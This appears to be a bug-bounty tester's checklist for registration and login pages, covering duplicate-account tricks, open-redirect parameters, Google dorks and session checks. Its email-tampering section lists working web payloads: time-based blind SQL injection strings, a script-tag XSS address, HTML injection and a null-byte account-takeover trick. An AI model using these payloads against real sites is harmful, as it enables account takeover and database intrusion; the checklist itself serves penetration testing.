 # Things to check on Registration functionality
1. Use multiple usernames at a time.
	eg- "ritik","victim"
2. Create account with company email.
3. Use extra long e-mail
4. Try hacker@email.com@target.com.
5. Change response code of "Email is already taken"
6. Go back to registration page after signing in
7. Sign up again as authrnticated user
8. Sign up using @target.com
9. Check about register pages using google dorks
```
site:example.com inurl:register inurl:& 
site:example.com inurl:signup inurl:& 
site:example.com inurl:join inurl:&.
```
10. If `myemail%00@email.com` is  interpreted as `myemail@email.com` Signup as `my%00email@email.com` for ATO
11. Register with same email/username but with appending non-printable characters.
12. If the website does not verify E-mail, register with `<whatever>@domain.com`
# Things to check on Registration functionality
1- Check for a redirect parameter on login page, try these
```returnUrl, goto, return\_url, returnUri, cancelUrl, back, returnTo```
	These can also be found on the source of login page

# Open Redirect 
Check for these parameters, if not present try to put and use them 
`returnUrl, goto, return_url, returnUri, cancelUrl, back, returnTo`

##  Tampering Email 
```

{"email":"asd@a.com"}
{"email":"asd@a.com"}
{"email":\"asd a\"@a.com"}
{"email":"asd(a)@a.com"}
{"email":"\"asd(a)\"@a.com"}
{"code":2002,"status":200" message":"email valid."}
```
### These Emails belong to the same ID
1.  email@email.com
2. email+1@email.com
3. e.m.a.i.l.@email.com

Email Verification Bypass Lead To SQL Injection
{"email":"asd'a@a.com"}
{"email":"asd'or'1'='1@a.com"}
{"email":"a'-IF(LENGTH(database())>9,SLEEP(7),0)or'1'='1@a.com"}
{"email":"\"a'-IF(LENGTH(database())=9,SLEEP(7),0)or'1'='1\"@a.com"}
{"email":"\"a'-IF(LENGTH(database())=10,SLEEP(7),0)or'1'='1\"@a.com"}
{"email":"\"a'-IF(LENGTH(database())=11,SLEEP(7),0)or'1'='1\"@a.com"}

Bypass Email using SSO chain and Integration
`<script>alert(0)</script>init.de.offensiveapproach@gmail.com`
HTML INjection in Email
`inti.de.ceukelaire+(<b>bold<u>underline<s>strike<br/>newline<strong>strong<sup>sup<sub>sub)@gmail.com`

### Session Management
1. sessionid randomness
2. Logout effectiveness
	1. Are sessions closed
	2. Browser cache
	3. back button
	4. Do cookies expire
	5. logout and then create/edit the cookie and then use it